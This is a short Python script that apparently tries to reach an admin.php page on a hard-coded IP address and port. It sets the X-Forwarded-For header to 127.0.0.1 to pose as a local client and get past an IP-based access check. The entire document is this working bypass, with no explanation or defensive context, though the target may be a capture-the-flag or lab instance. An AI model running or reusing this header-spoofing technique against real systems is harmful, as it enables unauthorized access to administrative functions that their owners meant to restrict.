import requests

headers = {'X-Forwarded-For': '127.0.0.1'}
response = requests.get('http://34.159.3.253:31730/admin.php', headers=headers)
print(response.text)